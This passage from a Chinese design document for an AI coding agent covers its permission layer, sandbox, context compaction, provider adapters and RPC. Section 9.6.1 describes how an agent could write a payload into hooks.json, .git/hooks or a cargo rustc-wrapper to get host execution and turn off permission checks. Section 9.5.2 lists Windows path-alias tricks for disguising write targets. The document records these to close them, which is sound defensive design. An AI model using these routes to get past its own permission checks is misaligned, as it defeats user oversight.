1. 默认模式下写操作逐次询问,弹窗显示**解析后的绝对路径**——用户能看出这次写的是不是项目外面;
2. §9.4 的安全检查覆盖敏感目标(SSH、凭证、shell 启动脚本、`.git` 内部、本应用配置),且**对「全部放行」免疫**;
3. Bash 命令的静态分析(§9.3)。

代价必须写明:「全部放行」和「无人值守」下,可写范围从"项目目录"变成了"整块磁盘减去那张敏感清单"。选这两个模式的人得知道这一点——设置页的模式描述和二次确认就是为此存在的。

#### 9.5.2 留下来的:路径形状检查

和边界无关的那部分照旧。Windows 的路径别名会让"看起来是什么"和"实际写到哪"对不上:ADS(`file.txt:stream`)、短文件名(`PROGRA~1`)、`\\?\` 前缀、尾部点和空格、DOS 设备名(`CON`、`NUL`)、NUL 字节。

`[约束]` 这些形状检查**一律执行,不分平台**,而且对字面路径和解析后的路径**各跑一次**。

- 不分平台:路径字符串来自模型,它可能生成任何风格;而且只在 Windows 上检查的话,这些用例在 Linux CI 上跑不到,等于没测。
- 各跑一次:symlink 可以指向 `/work/notes.txt:hidden` 或 `/work/NUL`,字面路径干干净净。

形状检查要在归一化**之前**做——那些别名构造的目的就是让解析结果和字面看起来不一样,先归一化再检查等于自己把证据抹了。

`[约束]` 但"解析后"那一次必须先剥掉 verbatim 前缀。Windows 上 `canonicalize` 返回的是 `\\?\D:\…`,原样送进形状检查会同时踩中两条规则:`\\?\` 前缀本身,以及盘符 `D:` 的冒号被当成 ADS。这不是理论风险——漏掉这一步,Windows 上**每一次** Read/Write 都会栽在第二道检查上,而且报给模型的理由是"含有 NTFS 备用数据流",于是它跑去修一个根本不存在的数据流写法。

剥前缀用 `riot_permissions::fence::strip_verbatim`,工具侧的 `resolve` 和宿主侧的工作区围栏(§9.5.1)共用这一份实现。两边各写一份的话只会修好一边:围栏那侧因为 `Path::starts_with` 按组件比较(`VerbatimDisk(D)` ≠ `Disk(D)`)早就踩过一次,工具侧后来又踩了同一个坑。

### 9.6 OS 沙箱与策略层正交

`[约束]` 沙箱(OS 强制)和权限规则(策略)是两层,不要混。

- macOS:`sandbox-exec` / seatbelt profile(**已落地**,`riot-runtime/src/sandbox.rs`)
- Windows:Restricted Token + Low IL(**已落地**,见 `docs/SANDBOX_WINDOWS.md`;那份文档解释了为什么不是 AppContainer)
- Linux:bubblewrap + seccomp(未排期)

沙箱内的 Bash 可以自动放行(既然 OS 层已经挡住了),模型也可以显式请求出沙箱(需要用户同意)。

#### 9.6.1 放宽的前提是「OS 真的挡得住」

`[约束]` 可写集里有几处**在边界之内、却能换来边界之外执行权**的目标,沙箱放宽档必须把它们排除,否则打开沙箱反而比不开更弱。

这条是一次真实回归的结论。沙箱默认开着,而 `bash::decide` 的放宽档基于"OS 已经挡住文件系统"直接 Allow ——于是 `cp payload .riot/hooks.json` 从"要问"变成了"静默放行",而下一轮 `HookEngine` 会把那个文件里的命令用 `sh -c` 裸跑在宿主上,还能返回 `permissionDecision: allow` 把整个权限层关掉。同类目标还有工作区里的 `.git/hooks/`、`git config core.hooksPath`、`~/.cargo/config.toml` 的 `rustc-wrapper`。

`[前提]` 收紧可写集**修不了这个**:`cargo build` 要写 `~/.cargo/.package-cache` 的锁,`rust-toolchain.toml` 会触发 rustup 自动装工具链,猜错一条的表现就是"构建莫名其妙失败"——而那正是用户直接关掉沙箱的理由。在 profile 里给这几条补 `deny` 也不行:沙箱按静态策略激活,它不知道用户这一次批准了什么,deny 会造出「点了允许、命令照样失败」。

所以挡在策略层:`riot_permissions::bash::write_targets` 扫子命令的参数字面量,命中就产出**对放行免疫**的 Ask。它同时补上了 §9.4 的一个老缺口——`safety::check` 走 `Tool::target_path`,而 Bash 返回 `None`,整个路径安全检查对它不生效;此前唯一能看见敏感路径的通道是命令分析器里的重定向目标检查,`cp` / `mv` / `install` / `sed -i` 一概看不见。

---

## 10. 上下文管理

### 10.1 token 计数

```rust
fn estimate_tokens(messages: &[Message]) -> u32 {
    // 最近一条带 usage 的 assistant 消息的真实 API 计数
    let (idx, base) = last_usage_checkpoint(messages);
    // 加上其后新增消息的粗估
    base + messages[idx+1..].iter().map(rough_estimate).sum::<u32>()
}
```

粗估规则:普通文本 4 字节/token,JSON 2 字节/token,图片固定 ~2000。

`[约束]` 不要每轮调 countTokens API(延迟和费用),也不要累加各轮 output(会双计)。

### 10.2 触发阈值

```
有效窗口 = context_window(model) − min(max_output_tokens, 20k)
压缩阈值 = 有效窗口 − 13k
```

`[约束]` **必须为压缩本身预留输出空间**,否则压缩请求自己也会溢出。这个 bug 只在接近上限时触发,很难在开发中遇到。

### 10.3 分层压缩管道

能便宜解决就不用贵的。第 1 层在**工具执行时**就发生(riot-tools),后两层在**压缩触发时**执行(riot-core 的 compactor):

| 层 | 机制 | 在哪 | 信息损失 |
|----|------|------|---------|
| 1. 结果落盘 | 超 64KiB 的文本结果写进工件目录,消息里换成头尾预览 + 路径(`Spilled`) | riot-tools `scheduler.rs::spill_oversized`,执行后统一收口 | 无(按路径可重读) |
| 2. 聚合预算 | 单消息内并行结果合计超限 → 替换 | **未实现**(见下) | — |
| 3. 清旧结果 | 旧 tool_result 清成占位符,只留最近 **8** 个(`ClearOldResults`,原设计写 5,实现取 8) | riot-core `compactor.rs` | 中 |
| 4. 全量总结 | LLM 总结替换历史 | riot-core `compactor.rs` | 高 |

第 1 层的两个要点:**Read 豁免**(它的输出本来就是磁盘文件的一个窗口,落盘会递归——读落盘文件的结果又被落盘,64KiB~256KiB 的内容模型永远够不到);落盘发生在凭证遮蔽**之前**,盘上是原文、预览照常被遮,日后 Read 回来再遮一次,两条路都不漏。这层真正接住的是**没有自带截断的外部结果**(MCP 文本)——内置工具各有上限(Read 256KiB、Bash/Grep 30k 字符)。

`[现状]` 第 2 层(聚合预算)未实现:内置工具的单结果上限 + 第 1 层的落盘把单条压住之后,「一批并行结果合计超限」的剩余风险很小(并行批大小上限 10),等真实场景撞上再做。注意 `tools/shrink.rs` **不是**这一层——那是发给模型的图片压缩(≤115 万像素),别看名字像。

`[现状]` 原设计还有一条「microcompact 只在 prompt cache 大概率已过期时(距上次交互 > 60 分钟,依赖 `Clock`)才主动执行」——**未实现**。当前第 3 层只在压缩被触发时执行(主动阈值或反应式溢出),那个时刻不压就溢出,缓存热不热已不是主要矛盾;每轮空转的定期 microcompact 及其 60 分钟判断因此一直没有落地。要恢复这条,记得 `AgentDeps.clock` 就是为它留的。

### 10.4 总结 prompt 的要点

- 强制 TEXT ONLY,禁止调用工具;
- 产出 `<analysis>` + `<summary>` 两段,**analysis 剥掉不进上下文**,只为提升总结质量;
- summary 结构化为固定几节:主要意图 / 关键技术概念 / 文件与代码片段 / 错误与修复 / **所有用户原话** / 待办 / 当前工作 / 下一步;
- 注入回对话时包装成"会话从上次中断处继续,直接接着做,不要问、不要复述"。

### 10.5 压缩后恢复工作集

`[约束]` 纯 summary 不够。压缩后必须重注入:

1. `file_state` 工作集里**最近 5 个已读文件**(取缓存内容,不重读磁盘;单文件 20k 字符 ≈5k token,总 100k 字符 ≈25k token,见 `session.rs::restored_files`);
2. 当前 plan / todo 状态;
3. 本会话已加载过的 skill 名单(避免重灌)。

模型"失忆"后要立刻知道最近在碰哪些文件,不必重走探索。这一条对实际体验的影响比总结质量本身还大。

---

## 11. Provider 层

### 11.1 抽象接口

```rust
#[async_trait]
pub trait Provider: Send + Sync {
    fn id(&self) -> &str;
    fn capabilities(&self) -> ProviderCapabilities;

    fn stream(
        &self,
        req: &ModelRequest,
        cancel: CancellationToken,
    ) -> BoxStream<'static, ModelStreamItem>;

    async fn count_tokens(&self, req: &ModelRequest) -> Result<u32, ProviderError>;
}

pub struct ProviderCapabilities {
    pub prompt_caching: bool,
    pub thinking: ThinkingSupport,
    pub parallel_tool_calls: bool,
    pub context_window: u32,
    pub max_output_tokens: u32,
}
```

`[约束]` 内部规范格式贴 Anthropic 的 `content_block` 结构(`tool_use` / `tool_result` / `thinking`),OpenAI 兼容协议通过适配器转换。理由:thinking、prompt caching、并行工具调用这些设计都基于这套结构,反过来转换会丢信息。

#### 11.1.1 OpenAI 兼容适配层的四条硬规矩

DeepSeek、Kimi、Qwen、OpenRouter、vLLM、Ollama 共用 `/v1/chat/completions`。适配写在 `openai/`,复用 SSE 解析、重试、看门狗 —— 那些只跟 HTTP 状态码有关,跟报文格式无关。

翻译时有四条不能违反的规矩。违反了服务端只回一句 `invalid request`,不告诉你是哪个字段:

1. **`role=tool` 必须紧跟带 `tool_calls` 的 assistant 消息**,且每个 `tool_call_id` 恰好一条。内部一条 User 消息里可能既有工具结果又有用户新说的话(用户在工具跑的时候插了一句),转换时工具结果要**先出**。
2. **`content` 不能是空字符串**。压缩清理过历史之后会真的出现空消息。
3. **`tool_calls[].function.arguments` 是 JSON 字符串**,不是对象。
4. **`reasoning_content` 不能回传**。DeepSeek 的文档明确要求,带上会 400。

`[约束]` 请求里必须带 `stream_options.include_usage`。不带的话流式响应没有 usage,上下文管理层就没有数据决定何时压缩 —— 而那个缺失不会报错,只会表现为"压缩从来不触发,然后某天突然撞上溢出"。

`[取舍]` `finish_reason == "length"` 报成 `ProviderError::OutputLimit`(可恢复),而不是正常结束。当成正常结束的话,模型的回答会缺一截而没有任何人知道。

### 11.2 请求组装收敛成一个函数

```rust
fn build_request(state: &AgentState, retry: &RetryContext) -> ModelRequest
```

`[约束]` 重试时想换模型、调低 `max_tokens`、退出 fast mode,一律改 `RetryContext` 重新调用这个函数,**不允许在重试分支里复制组包逻辑**。Claude Code 的 `paramsFromContext` 就是这个模式,能避免"重试路径的参数和首次请求悄悄不一致"。

### 11.3 流式处理

`[约束]` 五条实现要求:

1. **自己累加 `partial_json` 字符串,只在 `content_block_stop` 时 parse 一次。**不要每个 delta 都解析——那是 O(n²),大工具参数下很明显。
2. **加 idle watchdog。**HTTP timeout 只覆盖初始连接,流式 body 挂死它管不着。默认 90s 无数据就取消并报**可恢复错误**(交给重试管线,见 §11.4;原设计里"降级到非流式请求"未实现——重试一条新的流通常就够,非流式通道要单独维护一套解析,先不为一个没证实的场景付这个成本)。计时器在**每个事件后重置**,看的是「两个事件之间隔了多久」——按整条流计时会把正常的长响应误杀。
3. **usage 是累计值不是增量。**`message_delta` 里的字段可能回 0,直接覆盖会抹掉 `message_start` 报的真值。累加时对 input/cache 字段加 `> 0` 守卫。这个 bug 不会报错,只会让成本统计静默偏小。
4. **SSE 解析器收字节,不收字符串。**TCP 分片不认字符边界,一个中文字符被切成两个 chunk 是常态。UTF-8 重组必须在解析器内部统一做——推给 transport 层意味着每个 HTTP 客户端实现都要重做一遍,漏掉的那个会产生 `看��了` 这种乱码,而它不报错、不崩溃,只是内容悄悄坏掉。
5. **缓冲区扫描要记住上次扫到哪。**每来一个 chunk 就从头找分隔符是 O(n²)。一次几十 KB 的工具参数(切成几百个 chunk)就能让这一层吃掉可观的 CPU。

流的收尾也要处理:网关经常在最后一帧后直接断开,不补 `finish()` 就会丢掉 `message_stop`。缺 `message_stop` 时要把攒着的半条消息吐出来**并且报错**——半条比没有有用,但错误不能吞。否则主循环会拿到一个既没消息也没错误的空流,当成"模型没话说"正常结束,用户看到的是 agent 莫名其妙停下来了。

### 11.4 重试与降级

```
最大重试 10 次,指数退避:500ms × 2^(n-1),上限 32s,+25% 抖动
Retry-After 响应头优先
```

`[约束]` **按"用户是否在等结果"分层。**前台请求(主循环)重试 529;后台请求(标题生成、摘要)立即放弃。容量雪崩时每次重试都是数倍的网关放大,而后台失败用户根本看不见。

`RequestSource` 的默认值是 `Background`,取的是 fail-closed 方向:漏标 `Foreground` 只会让某个请求少重试几次(功能退化,看得见),漏标 `Background` 会让它在过载时参与雪崩放大(伤害别人,看不见)。

`[约束]` **401/403 只重试一次**,不能只靠 `max_attempts` 兜底。重试的前提是调用方刷新了凭证;刷不出来的话,重试十次就是十次 401——每次都是完整的网络往返,用户干等十轮退避(累计一分多钟)才看到"密钥无效",而这个结论第一次就知道了。

`[约束]` **抖动的 seed 必须先打散再取模。**调用方最可能传的是重试序号或时间戳这类连续值,直接 `seed % n` 会让它们全落在同一区间,抖动变成单向的——那等于没抖,同时失败的请求照样挤在一起重试。

`[约束]` **只有请求阶段的失败才重试。**一旦流吐出过任何事件,失败就只能上报。UI 已经渲染了那些内容,重试会让同一段文本出现两次,而内核这边没有撤销事件可发。宁可让用户看到明确的错误,也不要让他看到重复的半截回答——后者他会以为模型疯了。

模型降级:连续 3 次 529 → 换 fallback 模型。切换时必须:

1. 给已发出的孤儿 tool_use 补齐 error 结果;
2. **剥离 thinking signature**(签名与模型绑定,换模型重放会 400);
3. 发一条 system 事件告知用户。

第 2 条容易漏,所以 `RetryContext::fallback_to()` 把「换模型」和「剥签名」绑在同一个构造器里——分开写迟早会漏一个,而漏了之后的报错信息里不会提到签名两个字。

### 11.5 Prompt caching

| 位置 | 策略 |
|------|------|
| system 静态段 | 全局缓存断点,跨会话共享 |
| system 动态段 | 不打全局断点 |
| 工具 schema | 会话级缓存序列化结果,排序稳定 |
| messages | **整个请求恰好一个断点**,打在最后一条消息 |

`[约束]` system prompt 必须分成静态段和动态段,中间用一个显式的边界常量分隔。静态段里不允许放任何会在会话中途变化的内容(feature flag、时间、MCP 工具列表)——一旦变化就打碎缓存,而这个损失是跨用户的,不只影响自己。

`SystemSection` 的默认构造器是 `stable()`,要不缓存得显式写 `dangerous_volatile()`。名字起得长是故意的:「缓存是默认、不缓存要报备」这个方向,让命中率变成架构约束而不是事后优化。

`[约束]` **工具声明必须按名字排序。**schema 顺序抖一下整个工具块的缓存就失效,而顺序抖动在 HashMap 迭代下是随机发生的——表现为"缓存命中率时高时低",没人能定位。

`[约束]` **空 content 的消息必须过滤掉。**Anthropic 拒绝空 content 数组,报错是笼统的 400,不会告诉你是第几条消息。而空消息不是假想:模型返回空响应时,主循环就会产生一条 `Assistant { content: [] }`。

断点数量由 `validate_cache_breakpoints` 强制,`build_request` 里挂了 `debug_assert`。多打断点服务端会直接 400,而这个错误只在真实请求时才暴露,本地测试完全看不到。

---

## 12. 内核 RPC 协议

### 12.1 传输

JSON-RPC 2.0,换行分隔,over stdio。

`[取舍]` 不用 WebSocket(Codex 用的是 WS)。stdio 更简单,不需要端口分配和认证,而且进程退出时连接自动清理。代价是不能远程连接内核——这是非目标(§1.2)。

`[约束]` 必须实现 `kernel.shutdown` 方法。宿主关闭内核的第一步是调它,让内核 flush 会话状态、杀掉自己 spawn 的子进程,然后宿主才 drop stdin。见 §2.3 的关闭序列。

**协议一致性由编译器保证,不是靠 schema 校验。**内核和宿主都依赖同一个 `riot-protocol` crate,协议类型对不上直接编译失败。生成 JSON Schema 只是为了给 TypeScript 前端用——那一侧没法共享 Rust 类型,只能靠生成。

### 12.2 方法与事件分离

**方法(宿主 → 内核,有返回值)**:

```
session.create        { cwd, model }              → { session_id }
session.resume        { session_id }              → { messages }
session.list          { }                         → { sessions }
session.delete        { session_id }              → { }

turn.submit           { session_id, content }     → { turn_id }
turn.interrupt        { session_id, reason }      → { }
turn.queue_message    { session_id, content }     → { }

permission.respond    { request_id, decision }    → { }

config.get / config.set / tools.list / mcp.status ...
```

**事件(内核 → 宿主,单向推送)**:

```
event.agent           { session_id, event: AgentEvent }
event.kernel_error    { message, fatal }
```

`[约束]` `AgentEvent` 是唯一的会话事件载体。不要为了方便再加平行的事件类型——多一个通道就多一份保持同步的负担,而且黄金回放测试只订阅这一个通道。

### 12.3 类型生成

`riot-protocol` 里所有类型 derive `JsonSchema`,构建时生成:

1. JSON Schema 文件(`schemas/*.json`)—— 契约测试的基准;
2. TypeScript 类型(`src/bridge/generated.ts`)—— 前端直接用。

`[约束]` **TS 类型必须是生成的,不允许手写。**手写的类型定义会和 Rust 侧漂移,而且漂移不会有任何报错,只会在运行时表现为"某个字段永远是 undefined"。CI 里加一步:重新生成后 `git diff --exit-code`。

### 12.4 权限请求的往返

权限是唯一需要"内核暂停等宿主"的流程:

```
内核 → AgentEvent::PermissionRequest { request_id, detail }
                                                   ↓
                                            UI 弹窗
                                                   ↓
宿主 → permission.respond { request_id, decision }
内核 ← oneshot channel 唤醒,继续执行
```

`[约束]` 等待必须带超时和取消。用户可能直接关窗口,内核不能永久挂起:

```rust
tokio::select! {
    resp = rx => resp.unwrap_or(PermissionDecision::Deny),
    _ = cancel.cancelled() => PermissionDecision::Deny,
    _ = clock.sleep(PERMISSION_TIMEOUT) => PermissionDecision::Deny,
}
```

超时默认 deny,不是 allow。用户能配的是"等多久"(`askTimeoutSecs`,夹在 5–3600 秒),**不是"等不到时算同意"**。

`[取舍]` 默认 **60 秒**,不是十分钟。长任务的现实是没人会回来,一次误触发就把整轮任务钉住十分钟,而结局仍然是拒绝。既然结局一样,早点拒绝、让模型换条路走更有用。夹紧是必须的:`config.json` 用户能手改,`0` 会让每个弹窗瞬间超时 —— 那等于把「每次询问」悄悄变成「一律拒绝」,而界面上什么都看不出来。

`[约束]` 超时和取消要发 `PermissionResolved` 事件。宿主这边请求已经作废,界面却不知道的话,弹窗会一直挂着;用户过一会儿点"允许",什么都不会发生(操作早已按拒绝处理并继续往下走了),而界面表现得像成功了。等待上限缩到 60 秒后这条路径变得常见,不能再靠 `Done` 兜底。

#### 12.4.1 权限闸:决策链和"问用户"之间的那条缝

决策链(`riot-permissions::decide`)是纯函数,算得出 allow/ask/deny 但没法**问用户** —— 弹窗、等回应、被取消都是宿主的事。中间那条缝是 `PermissionGate` trait:调度器在执行每个工具前问一次,宿主决定怎么答。

`[约束]` 闸放在**调度器里**,不是工具内部。拒绝必须发生在副作用之前 —— 工具自己检查的话,"检查"和"动手"之间的每一行代码都是可能出错的地方。

`[约束]` 闸后要**重查取消**。等用户回答弹窗期间他可能按了停止,那时再去执行就是"我明明点了停止它还是改了文件"。

`[约束]` 被拒**不级联**到同批兄弟。用户拒绝一次写文件,不该把同批的读取也一起废掉 —— 那些结果模型还用得上。

`[取舍]` `Scheduler` 的 gate 字段是 `Option`,`None` 表示不检查。这只在测试里成立(那些用例验证的是调度行为:顺序、配对、级联,权限会把它们变成两件事)。生产路径必须调 `with_gate`。这是一个 fail-open 的默认值,代价是"忘了设置"等于无限权限 —— 用类型强制的话要改掉所有调度器测试,权衡之后选了在 `session.rs` 里放一个测试盯着。

### 12.5 内核已拆成独立进程

阶段 B 已落地(原先这一节记录的是"暂时内嵌"的取舍,那个阶段已经过去):

- `riot-kernel` 二进制承载会话运行时(`SessionManager` + 全部会话装配),stdin/stdout 上跑换行分隔的 JSON-RPC,stderr 走日志。
- 宿主 `kernel/supervisor.rs` 管进程(Job Object / 进程组、四步关闭序列),`kernel/client.rs` 管类型(`RpcRequest` 进、`RpcResponse` 出)和事件分发(每会话 Coalescer 合帧后进前端 Channel)。
- 权限往返已跨进程:内核发 `PermissionAsked` 事件 → 前端弹窗 → `permission.respond` RPC 回内核的待答表。
- 每轮配置(模型端点含明文 key、联网/视觉目标、limits、会话设置)由宿主打包成 `TurnConfig` 随 `turn.submit` 传入 —— 内核不读 config.json / auth.json。

- 终端/浏览器工具走**反向 RPC**(`protocol::hostcall`):内核往 stdout 写带 id+method 的请求,宿主执行(PTY / Chromium 都登记在宿主)后把应答写回内核 stdin。两个方向的 id 空间独立,靠"有无 method 字段"区分请求与应答。

- 内核死亡(stdout 关闭)时,宿主给每个还挂着的前端出口合成 `Done{Internal}`(INV-4:Done 必须出现),清掉所有会话的水合标记;下一次调用按 `RestartPolicy` 退避自动重启,连崩五次放弃报错。
- 打包:`externalBin` + `scripts/stage-kernel.mjs`(dev/build 前把 cargo 产物按 `riot-kernel-<triple>` 放进 `src-tauri/binaries/`);bundle 后内核在宿主可执行文件旁边,和 dev 时的 target 目录同一约定(`locate_kernel`)。

---

## 13. 前端架构

### 13.1 目录

实际布局(与最初规划的 store/features 结构不同,以此为准):

```
src/
├── bridge/           # 唯一允许调用宿主的地方
│   ├── generated.ts  # 从 schemas/protocol.json 生成,不要手改
│   └── index.ts      # 方法调用 + 事件订阅的封装
├── components/       # UI 组件
│   ├── Transcript.tsx  # 对话流:滚动语义(贴底/恢复)全在这里
│   ├── Composer.tsx    # 输入区:contenteditable 编辑器、附件、斜杠菜单
│   ├── Sidebar.tsx / Welcome.tsx / chrome.tsx  # 侧栏、欢迎页、窗口 chrome
│   ├── pickers.tsx / icons.tsx                 # 下拉件与内联 SVG
│   └── Settings、ToolCard、权限弹窗……
├── hooks/            # 会话状态(useSession 等,本地 state,没有用状态库)
├── lib/              # 纯工具(promptText:@引用/斜杠命令的解析,两侧共用)
└── App.tsx           # 装配根:布局状态 + Chat 会话装配(~1100 行)
```

`[约束]` `@` 引用和斜杠命令的**解析规则只有 `lib/promptText.ts` 一份**:
Composer 发出去的标记和 Transcript 画回来的块靠同一份规则对上。在任何
一侧就地写解析是在制造"发出去的引用画不回来"这类错位。

`[约束]` **组件里不允许出现 `invoke(...)` 或 `listen(...)`。**全部走 `bridge/`。这层抽象是以后换宿主(Tauri → Electron 或反之)的唯一保险,一旦被绕过就失效了。

`[现状]` 状态管理就是 `useSession` + 本地 state,**没有状态库**(zustand 依赖已删)。等出现"多个不相关组件要读同一份会话状态"这类真实痛点再引入,不为将来可能的需求先付一层间接。

长会话的渲染预算分三层,各管一段(都已落地):
1. **懒解析**——视口外的正文按纯文本占位,进视野(±1200px)再走 ReactMarkdown + highlight(`LazyMarkdown`;贴底 12 块立即解析,⌘F 查找时全量水合);
2. **VDOM**——`Row` / `ProcessGroup` 都是 `memo`,流式期间每帧重渲染不触碰历史行;
3. **排版绘制**——`.thread-col > *` 上 `content-visibility: auto`,离屏行浏览器直接跳过 layout/paint(样式文件里有取舍注释:为什么选它而不是 virtuoso 类窗口化列表——贴底/恢复那套滚动逻辑是按真实 DOM 高度调校的)。

真正的窗口化列表(限制 DOM 节点数)留作后手:只有 profiling 证明上面三层不够时才动,因为它要求推倒重写滚动语义。

### 13.2 事件消费:三层合批

内核事件是高频流,LLM token 流每秒可能上百条 delta。

`[约束]` **用 `tauri::ipc::Channel`,不要用 `app.emit()`。**官方文档写得很直接:事件系统"not designed for low latency or high throughput",它底层是拼 JS 字符串然后 eval。`Channel<T>` 是专为吞吐设计的,Tauri 内部拿它做下载进度和子进程输出,而且保证有序。

`Channel` 实现了 `Clone` 且是 `Send + Sync`,所以可以在 command 里接收后存进 `State`,让后台任务长期持有——这正是 token 流需要的模式,不必局限在单次调用内。

三层各自合批,缺一层效果就打折:

```
内核 → 宿主      每个 delta 一条 RPC(内核侧不合批,保持事件语义完整)
宿主 → WebView   16ms 攒一次,合成一条 Delta 事件  ← 降一到两个数量级
WebView → React  rAF 批量 setState                ← 防 React 被压垮
```

`[约束]` 中间那层的合批必须做。UI 每帧只能渲染一次,逐条过 IPC 是纯浪费。这一步的收益比换传输方式还明显。

```rust
// 宿主侧:攒 token,按帧发
let mut tick = interval(Duration::from_millis(16));
loop {
    tokio::select! {
        Some(d) = rx.recv() => buf.push_str(&d),
        _ = tick.tick() => {
            if !buf.is_empty() {
                let _ = sink.send(AgentEvent::Delta { text: std::mem::take(&mut buf), .. });
            }
        }
        else => break,
    }
}
```

`[约束]` 返回大块二进制(文件内容、图片)时用 `tauri::ipc::Response`,不要让 `Vec<u8>` 走 serde。它会被序列化成 **JSON 数字数组**,实测 6.3MB 的图片会膨胀到 22.5MB。

### 13.3 文件操作不走 tauri-plugin-fs

`[约束]` agent 的文件读写必须用自己写的 `#[tauri::command]`,不要用 `tauri-plugin-fs`。

原因是设计层面的:该插件明确禁止路径穿越,`../path/to/file` 一律拒绝。而 agent 要操作用户任意工作区,这个限制不是配置能绕开的。

自己写反而能实现**更有意义的**边界:按操作的性质和目标逐次判定(§9.4 的安全检查 + 逐次询问),而不是按一张静态的路径白名单。agent 的目标路径是运行时才产生的,capability 的静态 glob 从一开始就对不上这个语义——这也是后来把工作目录围栏整个撤掉的原因(§9.5.1)。

同理,文件监听用 `notify` + `notify-debouncer-full` 直接在 Rust 侧做,不用插件的 `watch`。必须 debounce 并过滤 `.git/`、`node_modules/`、`target/`——一次 `npm install` 能产生几万个事件。

### 13.4 组件选型的两个非显而易见结论

**代码编辑器用 CodeMirror 6,不用 Monaco。**macOS 的 WebView 是 WKWebView(WebKit),Monaco 在上面有已知的大文件和多光标性能问题。

**xterm.js 必须加载 WebGL addon。**canvas renderer 在高吞吐输出时两个平台都掉帧。

`[约束]` **从第一周就在 macOS 和 Windows 双平台上跑 CI。**Tauri 不打包浏览器,用的是系统 WebView(macOS 是 WKWebView,Windows 是 WebView2/Chromium),两者在 CSS、IME、字体渲染、资源缓存上都有实际差异。只在一个平台开发三个月然后发现另一个平台半个 UI 是坏的,是这个技术栈最常见的翻车方式。

### 13.3 输入框

第一版用受控 textarea。

`[约束]` **输入状态和渲染逻辑要分离。**以后要支持 @文件引用、内联 diff 卡片这类结构化节点时会换成 ProseMirror 或 Lexical(Codex 用的是 ProseMirror),届时只应该换渲染层,不应该重写整个输入区的状态管理。

---

## 14. TS→Rust 翻译对照

给实现者的速查表。左列是 Claude Code 一类实现里的 TS 形态,右列是本项目的 Rust 形态。

| TS 形态 | Rust 形态 | 备注 |
|---------|-----------|------|
| `async function*` | `async_stream::stream!` | 块必须返回 `()` |
| `AsyncGenerator<E, T>` 的 return 值 | `AgentEvent::Done` 变体 | §4.2 |
| `yield*` 委托 | `for await` in `stream!` 或手动 `while let Some(x) = s.next().await` | |
| discriminated union | `enum` + `#[serde(tag = "type")]` | 编译器强制穷尽匹配 |
| zod schema | `schemars::JsonSchema` derive | 同样一处定义拿到校验 + JSON Schema |
| `buildTool()` 补默认值 | trait 默认方法 | 更强:无默认值的方法编译器强制实现 |
| `ToolResult` + throw | `ToolOutcome` enum(含 `Failed` 变体) | 类型层面禁止错误抛穿 |
| `AbortController` + 手写链接 | `CancellationToken::child_token()` | 父子语义内置 |
| `abort(reason)` | token + 旁挂 `OnceLock<CancelReason>` | token 本身不带 reason |
| `Promise.all` | `FuturesOrdered` | **不是** `FuturesUnordered`,§7.3 |
| `renderToolResultMessage()` 返回组件 | `UiPayload` 结构化数据 | 内核不依赖 UI |
| `setTimeout` / `Date.now()` | `Clock` trait | 测试要能快进时间 |
| 字符串 ID | newtype `struct XxxId(String)` | |
| `try/catch` 兜底 | `JoinHandle` 捕获 panic | §6.4 第 10 步 |

### 14.1 已知的翻译陷阱

`[约束]` 这几条是 AI 实现时大概率会踩的,提前说明:

1. **不要在 `stream!` 块里用 `?`。**返回类型没有错误通道,编译器会拒绝。这是刻意的设计(§5.3),不是需要绕过的障碍。
2. **不要试图让 `stream!` 返回值。**已评估过 `async-gen`,不采用(§4.2)。
3. **`stream!` 块里持有跨 `yield` 的引用会遇到 lifetime 问题。**解法是把需要跨 yield 存活的数据 `clone` 或放进 `Arc`,不要试图用引用穿过 yield 点。
4. **`Tool` trait 里的 `async fn` 需要 `#[async_trait]`**,因为 trait object 要 dyn-compatible。返回 `BoxStream` 的方法则不需要。
5. **`CancellationToken` 的 `cancelled()` 是 `async fn`**,在 `tokio::select!` 里用;判断当前状态用同步的 `is_cancelled()`。别混。

---

## 15. 可下载能力包

有些能力的依赖大到不能进安装包。文档处理是第一个:要能创建和编辑 docx/xlsx/pptx/pdf,就得带上 Python(含 python-docx 一系)、Node(含渲染用的原生绑定)、LibreOffice 和一套 CJK 字体 —— 未压缩接近 900MB,而大多数用户用不到。

`[约束]` **目标用户的机器上没有开发环境。**这不是"最好能支持",而是这个子系统存在的全部理由 —— 如果可以要求用户先装 Python,那直接写文档说明就行了。由此推出三条硬性要求:包内所有二进制互相之间用**相对路径**引用;安装过程**不编译任何东西**;不依赖系统的 python / node / brew / apt。

### 15.1 磁盘布局与安装

```text
<config_dir>/riot/packs/
  doc-runtime/                当前安装。版本从里面的 pack.json 读
  .cache/<file>.part          断点续传的半成品
  .staging-<id>-<nonce>/      解压中间态,校验通过后原子 rename 过去
```

`[约束]` **解压必须先落到临时目录再 rename。**直接往目标目录解压的话,中途断电或退出会留下一个"看起来装好了、实际缺文件"的包 —— 那比没装更糟:状态显示已安装,用起来却在各种意想不到的地方报错,而且用户完全没有线索。

`[约束]` **装完必须实跑一遍包里的关键二进制**(`pack.json` 的 `selfCheck`)。这些二进制是从别处提取的,`soffice` 和 `python3.12` 只有 ad-hoc 签名。真被系统拦下时,失败要发生在用户刚点完"安装"的那一刻,而不是几天后他让模型"做个 PPT"的时候 —— 那时现场是一条模型也看不懂的 Bash 报错。自检用**最小 PATH**(只有包内目录加系统基础目录),否则开发机上的全局 python / node 会把包里缺的东西兜住,自检就白做了。

### 15.2 装完之后的三条接线

都复用已有机制,不新增架构:

| 线 | 机制 | 位置 |
|----|------|------|
| Skills | 技能发现多一个"能力包"层 | `skills::discover`,优先级 项目 > 全局 > **能力包** > 内置 |
| MCP | 按已装的包重建配置里属于包的那些条目,再 `reconcile_mcp` | `packs::sync_mcp` |
| PATH | `DocPackRunner` 装饰器,和 `VenvRunner` 同一条链 | `session::build_scheduler` |

能力包排在全局技能**后面**:用户想改包里带的技能时,在全局目录放一个同名的就能盖掉,不必去改包内容(那会在下次升级时被覆盖)。

MCP 条目的归属按 **command 路径是否落在能力包目录下**判断,不靠 id 前缀也不在 `McpServerConfig` 上加字段。id 前缀会泄漏到工具名里(模型会看到 `pack__doc_artifact_tool` 这种东西),加字段则要动一个用户会手编的配置结构。路径是现成的、不会撒谎的事实。`enabled` 跨升级保留 —— 用户特意关掉过的服务器不该因为包升级又自己开回来。

### 15.3 只有一部分目录进 PATH

`[约束]` **包里的 `python` 和 `node` 绝不进 PATH。**进了的话,用户给会话配了虚拟环境时,一句 `python manage.py` 会拿到包里这份、找不到项目依赖。为了文档功能把用户原本的工作流弄坏,是不划算的。

